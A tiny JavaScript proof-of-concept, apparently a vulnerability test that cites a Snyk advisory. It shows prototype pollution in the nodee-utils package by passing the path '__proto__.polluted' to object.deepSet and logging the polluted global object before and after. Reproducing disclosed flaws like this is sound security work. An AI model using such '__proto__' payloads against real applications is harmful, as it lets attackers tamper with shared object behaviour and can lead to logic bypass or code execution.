// //https://snyk.io/vuln/SNYK-JS-NODEEUTILS-598679

// test("prototype pollution in nodee-utils", () => {
  const { object } = require("nodee-utils");
  var obj = {};

console.log({}.polluted);

  object.deepSet({}, "__proto__.polluted", "yes");
console.log({}.polluted);
// });
